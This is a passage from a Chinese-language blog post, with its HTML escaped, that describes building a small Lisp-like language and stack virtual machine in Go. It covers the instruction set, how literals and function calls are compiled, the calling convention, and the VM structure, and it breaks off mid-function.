&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">Symbol&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">TypeName&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;symbol&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">Nil&lt;/span> &lt;span class="kd">struct&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">n&lt;/span> &lt;span class="nx">Nil&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">TypeName&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;nil&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>省略了一部分，领会精神即可。上面定义的 &lt;code>Symbol&lt;/code> 类型其实就是 &lt;code>#ident&lt;/code> 这种语法元素，目的是保持语义上的简洁。&lt;/p>
&lt;p>比如说 &lt;code>(let a b)&lt;/code>，在 minilang 里解释成以&lt;code>a&lt;/code>和&lt;code>b&lt;/code>作为参数，调用&lt;code>let&lt;/code>函数，&lt;code>a&lt;/code>和&lt;code>b&lt;/code>都会被求值。&lt;code>let&lt;/code>是一个内置函数，在当前环境里定义一个新的变量并设初值。&lt;/p>
&lt;p>可实际写代码的人想要的可能是 &lt;em>定义a，初始化为b&lt;/em>。这种情况下我们不希望&lt;code>a&lt;/code>被求值，而是字面意思：标识符&lt;code>a&lt;/code>，传给&lt;code>let&lt;/code>函数。这种情况下就可以用 &lt;code>(let #a b)&lt;/code> ，&lt;code>#a&lt;/code> 表示一个 &lt;code>Symbol&lt;/code> 类型的字面量。&lt;/p>
&lt;p>或许有人会注意到本质上来说&lt;code>#a&lt;/code>是个语法糖，也可以被写成 &lt;code>(quote &amp;quot;a&amp;quot;)&lt;/code> 这样的形式。&lt;code>quota&lt;/code> 定义为将字符串构造成 &lt;code>Symbol&lt;/code> 对象的函数。&lt;/p>
&lt;h3 id="指令集">指令集&lt;/h3>
&lt;p>有了基本的对象模型，再定义最基本的指令。因为考虑将代码也视作数据，所以目前的想法还是把控制结构也做成内置函数，因此指令集里不需要太多转移指令。&lt;/p>
&lt;p>暂定的指令集如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">type&lt;/span> &lt;span class="nx">OpCode&lt;/span> &lt;span class="kt">int32&lt;/span>
&lt;span class="kd">const&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="nx">RESERVED&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">iota&lt;/span>
&lt;span class="c1">// CALL &amp;lt;STR&amp;gt;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 压栈下一条指令的地址，跳转到指定位置
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">CALL&lt;/span>
&lt;span class="c1">// RET &amp;lt;OBJ&amp;gt;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 取栈顶的对象作为跳转地址，压栈返回值
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">RET&lt;/span>
&lt;span class="c1">// LOAD &amp;lt;STR&amp;gt;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 读取局部环境里的变量压栈
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">LOAD&lt;/span>
&lt;span class="c1">// PUSH &amp;lt;NUM&amp;gt;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 压栈对象
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">PUSH&lt;/span>
&lt;span class="c1">// POP &amp;lt;NUM&amp;gt;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 出栈一定数量的对象，出栈的对象直接丢弃
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">POP&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">o&lt;/span> &lt;span class="nx">OpCode&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">String&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="s">&amp;#34;RESERVED&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;CALL&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;RET&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;LOAD&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;PUSH&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;POP&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">}[&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>除了最初的 &lt;code>RESERVED&lt;/code> 是故意占用了零值，剩下的就是有效的指令了。&lt;/p>
&lt;p>写过 x86 汇编的话会看的很不习惯，因为完全没考虑寻址。&lt;/p>
&lt;ul>
&lt;li>&lt;code>CALL&lt;/code> 指令的操作数对象是字符串的时候，在本地环境寻找对应名称的内建函数；
&lt;ul>
&lt;li>或者，操作数是 UINT 的话，压栈下一条指令地址后跳转到指定位置，和 x86 汇编类似；&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>RET&lt;/code> 把当前栈顶的变量(UINT)当成下一个指令的地址&lt;/li>
&lt;li>&lt;code>LOAD&lt;/code> 在本地环境寻找对应名称的变量压栈&lt;/li>
&lt;/ul>
&lt;p>剩余略。其实可以看出直接对机器编程中的寻址被替换成了根据变量名（字符串）查找本地环境，很多高层级的概念（对象、字符串）被糅杂在里面。&lt;/p>
&lt;h2 id="0x02-编译">0x02 编译&lt;/h2>
&lt;p>接下来是把抽象语法树翻译成指令序列。&lt;/p>
&lt;h3 id="字面量翻译">字面量翻译&lt;/h3>
&lt;p>因为 minilang 的指令直接操作对象，所以能很省事地把字面量都构造成相应地对象。对于更复杂的对象，也可以编译成构造指令，当然目前不涉及。&lt;/p>
&lt;p>举个例子，列表字面量 &lt;code>#(display hello)&lt;/code>。可以在编译过程里直接构造出 &lt;code>List&lt;/code> 对象，然后生成一个 &lt;code>PUSH List{}&lt;/code> 指令，这样做的好处是更简单，效率会更好一点，毕竟少几个解释执行的指令。相应的限制是不能引用环境里的变量，因为在构造字面量对象的过程里还没有进入运行时环境。&lt;/p>
&lt;p>比如说 &lt;code>#(display name)&lt;/code>，如果编译成 &lt;code>PUSH List{display, name}&lt;/code>，那么&lt;code>name&lt;/code>在此刻就不能被求值，必须延迟到执行的时候才能求值&lt;code>name&lt;/code>。这里又涉及编译期的计算，比如我可以定义一个编译阶段执行的指令格式 &lt;code>[elem...]&lt;/code>，编译的时候对 &lt;code>[elem...]&lt;/code>求值，求值结果写进编译出的指令里。也是后话。&lt;/p>
&lt;p>编译成指令的好处是之后要做 JIT 或者全量编译成本地代码的话，不需要重新处理这个字面量，写一堆 case 把字面量编译成几个函数调用。&lt;/p>
&lt;p>扯远了，先前我们拿 &lt;code>gocc&lt;/code> 生成好了语法树，接下来就是简单地做一下翻译。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">case&lt;/span> &lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Boolean&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">UInt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Float&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Symbol&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Quoted&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">String&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nx">instructions&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">instructions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">vm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ObjectFromLiteral&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中 &lt;code>vm.ObjectFromLiteral(node)&lt;/code> 就是负责把从抽象语法树节点构造出对象实例的函数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">ObjectFromLiteral&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">node&lt;/span> &lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Node&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">Object&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="nx">node&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">node&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="kd">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Float&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nf">Float&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">UInt&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nf">UInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">String&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nf">String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Boolean&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nf">Boolean&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Quoted&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nx">lst&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">List&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GetValue&lt;/span>&lt;span class="p">().([]&lt;/span>&lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Node&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">lst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">underlying&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">lst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">underlying&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">ObjectFromLiteral&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">lst&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Symbol&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nf">Symbol&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Fatalf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;unexpected ast node in ToValue %v(%T)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">node&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">node&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Quoted&lt;/code> 表示列表字面量。这个函数本身很简单很直白，限制是对于非字面量的节点不能求值（比如 Identifier、函数调用都只能在运行时求值）。&lt;/p>
&lt;h3 id="函数调用翻译">函数调用翻译&lt;/h3>
&lt;p>接着就是重头戏，函数调用的翻译。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">case&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">List&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nx">elements&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GetValue&lt;/span>&lt;span class="p">().([]&lt;/span>&lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Node&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">elements&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="nx">vm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Instruction&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 参数从右到左压栈
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">elements&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">--&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Compile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">elements&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]);&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">instructions&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">instructions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 压入参数数量
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">instructions&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">instructions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">vm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">UInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">elements&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;span class="c1">// 插入调用语句
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">callee&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">elements&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">ident&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">callee&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Identifier&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">instructions&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">instructions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">vm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Instruction&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">OpCode&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">vm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CALL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Operand&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">vm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Object&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">vm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Symbol&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">)},&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>谈函数调用的编译前必须先确定好调用约定。这里采用了和 cdecl 类似的调用约定，参数从右往左压栈，同时在最左添加一个参数数量的参数，就像是 &lt;code>object f(object argc, object ...argv)&lt;/code> 一样，领会精神。&lt;/p>
&lt;p>函数的返回值一律包装成 object 返回，不允许多返回值（但可以考虑加个解构语法之类的糖），返回值也通过栈传递。&lt;/p>
&lt;p>整个函数调用的过程可以描述为：&lt;/p>
&lt;ol>
&lt;li>调用方参数压栈&lt;/li>
&lt;li>调用方参数数量压栈&lt;/li>
&lt;li>调用方返回地址压栈&lt;/li>
&lt;li>调用方跳转到函数入口（或者进入内置函数）&lt;/li>
&lt;li>被调方弹出返回地址&lt;/li>
&lt;li>被调方弹出所有参数&lt;/li>
&lt;li>被调方压栈返回值&lt;/li>
&lt;li>被调方跳转至返回地址&lt;/li>
&lt;/ol>
&lt;p>一句话概括就是被调方清栈，返回值放在栈顶。对于内置函数，步骤5-8都要在内置函数里完成。之后做用户定义 &lt;code>procedure&lt;/code> 的话就要在 &lt;code>procedure&lt;/code> 编译结果里加上平栈的代码了。现在还在纠结 &lt;code>POP&lt;/code> 指令直接把弹出的对象给丢弃了，该怎么暂存返回地址。实在不行就改成调用方清栈得了。&lt;/p>
&lt;h2 id="0x03-虚拟机抽象">0x03 虚拟机抽象&lt;/h2>
&lt;p>虚拟机理解为一个状态容器，包括指令空间（指令集合和指令指针）、数据空间（栈、本地变量），给一个简单的构造器。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">type&lt;/span> &lt;span class="nx">MiniVM&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">Stack&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">Object&lt;/span> &lt;span class="c1">// 栈空间，包括传参和本地变量都存放在这里
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">Top&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="c1">// 栈顶地址
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">Locals&lt;/span> &lt;span class="kd">map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nx">Object&lt;/span> &lt;span class="c1">// 本地变量，从这里查找变量和可调用的对象
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">IP&lt;/span> &lt;span class="nx">UInt&lt;/span> &lt;span class="c1">// Instruction Pointer 指令指针
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">Instructions&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">Instruction&lt;/span> &lt;span class="c1">// 程序指令集合
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">NewMiniVM&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">instructions&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">Instruction&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">MiniVM&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">MiniVM&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Stack&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="nx">Object&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">Top&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">IP&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Instructions&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">instructions&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Locals&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nx">Object&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后定义每个指令的执行逻辑。这里其实有点像是设计模式里的命令模式（Commnad Pattern）。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">MiniVM&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">instCall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span> &lt;span class="nx">Instruction&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Errorf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;invalid CALL instruction: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">sym&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].(&lt;/span>&lt;span class="nx">Symbol&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">proc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">LookupProc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">sym&lt;/span>&lt;span class="p">));&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">proc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isBuiltin&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">UInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">IP&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">proc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Builtin&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="nx">proc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Location&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
